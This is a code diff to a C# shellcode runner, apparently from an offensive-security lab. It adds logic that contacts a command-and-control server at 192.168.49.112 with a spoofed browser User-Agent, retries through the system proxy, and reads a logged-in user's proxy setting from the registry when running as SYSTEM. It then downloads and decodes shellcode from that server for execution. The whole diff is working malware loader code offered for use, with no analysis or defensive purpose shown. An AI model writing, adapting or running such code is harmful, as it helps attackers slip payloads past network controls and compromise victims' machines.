@@ -3,6 +3,7 @@ using System.Net;
 using System.Text;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
 
 public class ShellcodeRunner
 {
@@ -29,9 +30,42 @@ public class ShellcodeRunner
 
     private static byte[] LoadShellcode(string address)
     {
+        WebClient wc = new WebClient();
+        try
+        {
+            // Attempt direct access to C2 server
+            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
+            wc.Proxy = null;
+            wc.DownloadString("http://192.168.49.112/");
+        }
+        catch
+        {
+            try
+            {
+                // Enable automatic proxy when callback to the C2 server fails
+                wc = new WebClient();
+                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
+                wc.DownloadString("http://192.168.49.112/");
+            }
+            catch
+            {
+                // When running in SYSTEM integrity level, detect proxy settings manually
+                string sid = "";
+                foreach (string name in Registry.Users.GetSubKeyNames())
+                    if (name.Contains("S-1-5-21-"))
+                    {
+                        sid = name;
+                        break;
+                    }
+
+                string subKey = sid + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\";
+                string proxyAddr = (string)Registry.Users.OpenSubKey(subKey, false).GetValue("ProxyServer");
+                wc.Proxy = new WebProxy("http://" + proxyAddr);
+            }
+        }
+
         // Download shellcode from C2
-        WebClient client = new WebClient();
-        byte[] shellcode = client.DownloadData(address);
+        byte[] shellcode = wc.DownloadData(address);
 
         // Decode and decrypt shellcode
         shellcode = Convert.FromBase64String(Encoding.Default.GetString(shellcode));
